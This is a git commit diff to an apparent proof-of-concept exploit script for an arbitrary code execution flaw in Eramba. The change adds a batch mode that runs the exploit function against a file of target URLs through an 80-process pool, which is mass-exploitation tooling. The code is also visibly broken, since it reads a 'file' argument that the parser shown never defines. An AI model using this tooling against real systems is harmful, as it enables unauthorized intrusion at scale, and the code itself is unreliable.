7ef5b7d5882db40d51ec9b3b91471d3ed8e01f88
wsgdr7 <3074394329@qq.com>
2024-08-01 19:58:21 +0800

    Update Eramba ---rce.py

--- Eramba ---rce.py
+++ Eramba ---rce.py
@@ -26,8 +26,17 @@ def main():
     parser = argparse.ArgumentParser(description='Eramba任意代码执行漏洞')
     parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
     args = parser.parse_args()
-    if args.url:
+    if args.url and not args.file:
         poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip())
+        pool = Pool(80)
+        pool.map(poc,url_list)
+        pool.close()
+        pool.join()
     else:
         print(f"Usage:\n\t python3 {sys.argv[0]} -h")
 
